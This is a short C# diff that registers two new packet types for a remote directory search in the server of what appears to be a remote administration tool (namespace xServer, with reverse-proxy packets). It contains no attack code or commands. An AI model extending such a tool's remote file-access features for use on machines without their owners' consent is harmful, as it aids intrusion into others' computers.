@@ -86,7 +86,9 @@ namespace xServer.Core.Packets
                 typeof (ReverseProxy.Packets.ReverseProxyConnectResponse),
                 typeof (ReverseProxy.Packets.ReverseProxyData),
                 typeof (ReverseProxy.Packets.ReverseProxyDisconnect),
-                typeof (Packets.ClientPackets.GetConnectionsResponse)
+                typeof (Packets.ClientPackets.GetConnectionsResponse),
+                typeof (Packets.ServerPackets.SearchDirectory),
+                typeof (Packets.ClientPackets.SearchDirectoryResponse)
 
             };
         }
